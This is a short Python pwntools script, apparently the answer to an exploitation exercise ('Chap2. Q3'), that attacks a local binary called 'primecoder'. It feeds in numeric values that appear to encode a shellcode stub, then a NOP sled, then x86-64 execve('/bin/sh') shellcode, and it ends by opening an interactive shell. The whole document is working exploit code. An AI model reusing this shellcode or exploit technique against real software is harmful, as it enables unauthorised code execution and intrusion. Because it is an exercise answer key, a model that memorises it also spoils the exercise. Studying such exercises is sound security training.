#!/usr/bin/python

# answer to Chap2. Q3

from pwn import *

r = process("./primecoder")

r.sendline(str(0x5e555151))
r.sendline(str(0x5f006a97))
r.sendline(str(0x90006a5d))
r.sendline(str(0x51505891))
r.sendline(str(0x5a7e6a57))
r.sendline(str(0x0404050f))

print 'Process pid:', proc.pidof(r)[0]
raw_input('First wave of payload ->')

# one \x90 eaten by scanf, one \n supplemented, balanced!
r.sendline('\x90' * 22)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

r.sendline(shellcode)

r.sendline(cyclic(127))
r.interactive()
